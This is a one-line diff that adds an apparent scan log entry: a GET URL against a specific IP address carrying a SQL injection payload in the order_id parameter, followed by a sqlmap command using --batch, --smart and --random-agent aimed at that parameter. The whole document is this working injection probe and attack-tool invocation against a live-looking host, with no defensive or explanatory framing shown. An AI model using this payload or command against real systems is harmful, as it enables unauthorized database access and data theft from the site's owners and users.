@@ -1,0 +1,1 @@
+http://111.230.211.247:666/api/order/info?order_id=-1'%20OR%203*2*1=6%20AND%2000095=00095%20--%20 (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests\002_SQL_Injection_order_id_3883650099934397475.txt --batch --smart --random-agent --output-dir sqlmap_output\002_3883650099934397475 -p order_id
